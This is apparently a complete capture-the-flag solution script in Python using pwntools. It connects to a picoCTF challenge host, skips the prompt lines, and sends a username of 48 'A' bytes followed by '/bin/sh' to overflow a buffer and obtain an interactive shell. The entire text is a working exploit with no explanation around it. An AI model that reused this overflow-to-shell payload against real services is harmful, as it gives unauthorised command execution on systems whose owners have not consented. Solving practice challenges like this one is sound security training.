from pwn import *

io = remote('amiable-citadel.picoctf.net', 62754) 
io.recvline() 
io.recvline()  
io.recvuntil(b'Enter username: ')
payload = b'A' * 48 + b'/bin/sh'

io.sendline(payload)
io.interactive()

